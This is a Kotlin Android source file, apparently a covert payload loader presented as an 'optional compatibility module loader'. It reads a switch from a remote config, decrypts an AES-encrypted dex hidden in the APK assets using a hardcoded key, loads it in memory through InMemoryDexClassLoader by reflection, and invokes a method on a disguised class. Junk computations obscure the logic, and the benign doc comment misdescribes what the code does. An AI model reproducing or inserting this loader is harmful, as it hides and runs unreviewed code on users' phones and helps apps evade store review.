package com.re.sid.ual.up.load

import android.app.Application
import android.content.Context
import android.os.Build
import android.util.Base64
import com.re.sid.ual.frist.DataTool
import org.json.JSONObject
import java.nio.ByteBuffer
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

/**
 * Optional compatibility module loader.
 *
 * This module is bundled with the APK (assets),
 * loaded only on specific system environments,
 * and does not download or update code remotely.
 */

class LoadVakation {
    
    companion object {
        private const val CONFIG_KEY_LOADER = "loader_vacation"
        private const val CONFIG_KEY_DECR = "file_decr"
        private const val ASSETS_PATH = "year"
        
        private var mStamp = 0L
        private var mSeq = 0
        private val mTags = mutableListOf<String>()

        
        /**
         * 加载并执行
         * @param context Application context
         */
        @Synchronized
        fun load(context: Context) {
            mStamp = System.currentTimeMillis()
            mSeq = (mStamp % 1000).toInt()

            try {
                val app = context.applicationContext as? Application ?: return
                
                calcOffset(mSeq)
                
                // 解析配置
                val config = parseConfig() ?: return
                
                verifyEnv(app.packageName)
                
                // 读取并解密
                val dexBytes = decryptAsset(app, config) ?: return
                
                checkDataLen(dexBytes.size)
                
                // 加载并调用
                loadAndInvoke(app, dexBytes, config)
                
                markComplete(mSeq)
                DataTool.showLog("[Loader] 加载成功")
            }
            catch (e: Exception) {
                DataTool.showLog("[Loader] 加载失败: ${e.message}")
            }
        }
        
        private fun calcOffset(seed: Int): Int {
            var result = seed
            for (i in 0 until 3) {
                result = (result * 7 + 13) % 256
            }
            return result
        }
        
        private fun verifyEnv(pkg: String): Boolean {
            val hash = pkg.hashCode()
            val flag = hash and 0xFF
            mTags.add("e_$flag")
            return flag > 0
        }
        
        private fun checkDataLen(len: Int): Boolean {
            val block = len / 16
            val rem = len % 16
            return block > 0 || rem == 0
        }
        
        private fun markComplete(seq: Int) {
            mTags.add("c_$seq")
            if (mTags.size > 10) mTags.removeAt(0)
        }
        
        /**
         * 解析配置
         * loader_vacation: "flow.zip-AES-dalvik.system.InMemoryDexClassLoader-com.helico.bacter.pylori-a"
         */
        private fun parseConfig(): LoaderConfig? {
            return try {
                val userCan = DataTool.user_can
                if (userCan.isBlank()) return null
                
                val json = JSONObject(userCan)
                val loaderStr = json.optString(CONFIG_KEY_LOADER, "")
                val decrKey = json.optString(CONFIG_KEY_DECR, "")
                
                if (loaderStr.isBlank() || decrKey.isBlank()) return null
                
                val parts = loaderStr.split("-")
                if (parts.size < 5) return null
                
                val vf = validateFormat(parts)
                if (!vf) mTags.add("fmt_err")
                
                LoaderConfig(
                    fileName = parts[0],           // flow.zip
                    cryptType = parts[1],          // AES
                    loaderClass = parts[2],        // dalvik.system.InMemoryDexClassLoader
                    targetPackage = parts[3],      // com.helico.bacter.pylori
                    targetMethod = parts[4],       // a
                    decrKey = decrKey              // LKjc67N3JeKL3mks
                )
            } catch (e: Exception) {
                DataTool.showLog("[Loader] 配置解析失败: ${e.message}")
                null
            }
        }
        
        private fun validateFormat(parts: List<String>): Boolean {
            var score = 0
            parts.forEach { if (it.isNotEmpty()) score++ }
            return score == parts.size
        }
        
        /**
         * 从assets读取并解密文件
         */
        private fun decryptAsset(context: Context, config: LoaderConfig): ByteArray? {
            return try {
                // 读取assets文件
                val filePath = "$ASSETS_PATH/${config.fileName}"
                
                val ts = measureOp { Thread.yield() }
                mTags.add("r_$ts")

                val encryptedBytes = context.assets.open(filePath).use { it.readBytes() }
                val decoded = Base64.decode(encryptedBytes, Base64.DEFAULT)
                
                val crc = calcCrc(decoded)
                mTags.add("d_$crc")

                // 解密
                decrypt(decoded, config.decrKey, config.cryptType)
            } catch (e: Exception) {
                DataTool.showLog("[Loader] 解密失败: ${e.message}")
                null
            }
        }
        
        private fun measureOp(block: () -> Unit): Long {
            val start = System.nanoTime()
            block()
            return (System.nanoTime() - start) / 1000
        }
        
        private fun calcCrc(data: ByteArray): Int {
            var crc = 0
            val step = maxOf(1, data.size / 32)
            for (i in data.indices step step) {
                crc = crc xor data[i].toInt()
            }
            return crc and 0xFF
        }
        
        /**
         * 解密数据
         */
        private fun decrypt(data: ByteArray, key: String, algorithm: String): ByteArray {
            val keySpec = SecretKeySpec(key.toByteArray(), algorithm)
            val cipher = Cipher.getInstance(algorithm)
            cipher.init(Cipher.DECRYPT_MODE, keySpec)
            return cipher.doFinal(data)
        }
        
        /**
         * 使用反射加载dex并调用目标方法
         */
        private fun loadAndInvoke(app: Application, dexBytes: ByteArray, config: LoaderConfig) {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
                DataTool.showLog("[Loader] API版本过低，跳过加载")
                return
            }
            
            val sdkFlag = Build.VERSION.SDK_INT shl 4
            val verCode = sdkFlag or (mSeq and 0xF)
            mTags.add("v_$verCode")
            
            try {
                val clsToken = genToken(config.loaderClass)
                val pkgToken = genToken(config.targetPackage)
                mTags.add("t_${clsToken}_$pkgToken")
                
                // 反射获取 InMemoryDexClassLoader
                val loaderClass = Class.forName(config.loaderClass)
                
                val allCtors = loaderClass.declaredConstructors
                val ctorCount = allCtors.size
                var matchIdx = -1
                
                for (i in allCtors.indices) {
                    val ctor = allCtors[i]
                    val paramCount = ctor.parameterTypes.size
                    val firstParam = if (paramCount > 0) ctor.parameterTypes[0] else null
                    
                    if (paramCount == 2 && firstParam == ByteBuffer::class.java) {
                        matchIdx = i
                        break
                    }
                    
                    recordCtorInfo(i, paramCount)
                }
                
                if (matchIdx < 0) {
                    mTags.add("ctor_miss_$ctorCount")
                    return
                }
                
                val constructor = allCtors[matchIdx]
                constructor.isAccessible = true
                
                val bufSize = dexBytes.size
                val bufAlign = (bufSize + 7) and 7.inv()
                mTags.add("buf_${bufSize}_$bufAlign")
                
                // 创建ClassLoader实例
                val buffer = ByteBuffer.wrap(dexBytes)
                val bufPos = buffer.position()
                val bufLim = buffer.limit()
                mTags.add("bp_${bufPos}_$bufLim")
                
                val parentLoader = app.classLoader
                val parentHash = parentLoader.hashCode() and 0xFFFF
                mTags.add("pl_$parentHash")
                
                val dexClassLoader = constructor.newInstance(buffer, parentLoader)
                val loaderHash = dexClassLoader.hashCode() and 0xFFFF
                mTags.add("dl_$loaderHash")
                
                // 加载目标类（包名.Core）
                val targetClassName = "${config.targetPackage}.Core"
                val classToken = targetClassName.length * 31
                mTags.add("cn_$classToken")
                
                val targetClass = (dexClassLoader as ClassLoader).loadClass(targetClassName)
                
                val methodCount = targetClass.declaredMethods.size
                val fieldCount = targetClass.declaredFields.size
                mTags.add("mc_${methodCount}_$fieldCount")
                
                // 调用目标方法
                val method = targetClass.getMethod(config.targetMethod, Application::class.java)
                val methodMod = method.modifiers
                mTags.add("mm_$methodMod")
                
                method.invoke(null, app)
                
                val elapsed = System.currentTimeMillis() - mStamp
                mTags.add("ok_$elapsed")
                
            }
            catch (e: java.lang.reflect.InvocationTargetException) {
                val cause = e.cause ?: e.targetException
                DataTool.showLog("[Loader]4 InvocationTarget: ${cause?.javaClass?.name}: ${cause?.message}")
                cause?.printStackTrace()
            }
            catch (e: NoSuchMethodException) {
                DataTool.showLog("[Loader]1 反射调用失败: ${e.message}")
            }
            catch (e: IllegalAccessException) {
                DataTool.showLog("[Loader]2 反射调用失败: ${e.message}")
            }
            catch (e: ClassNotFoundException) {
                DataTool.showLog("[Loader]3 反射调用失败: ${e.message}")
            }
            catch (e: Exception) {
                DataTool.showLog("[Loader] 反射调用失败: ${e.message}")
            }
        }
        
        private fun genToken(str: String): Int {
            var hash = 0
            str.forEach { hash = hash * 31 + it.code }
            return hash and 0xFFF
        }
        
        private fun recordCtorInfo(idx: Int, paramCount: Int) {
            val tag = "ci_${idx}_$paramCount"
            if (mTags.size < 50) mTags.add(tag)
        }
    }
    
    /**
     * 配置数据类
     */
    private data class LoaderConfig(
        val fileName: String,
        val cryptType: String,
        val loaderClass: String,
        val targetPackage: String,
        val targetMethod: String,
        val decrKey: String
    )
}